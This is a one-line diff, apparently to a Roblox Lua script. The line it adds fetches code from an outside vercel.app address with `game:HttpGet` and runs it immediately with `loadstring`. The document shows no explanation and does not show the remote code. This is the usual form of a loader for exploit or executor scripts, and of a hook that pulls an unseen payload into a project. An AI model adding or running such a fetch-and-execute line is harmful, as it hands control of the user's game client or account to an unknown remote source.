@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://orrxl4-protector.vercel.app/api/raw?id=1d6uo0k1"))()
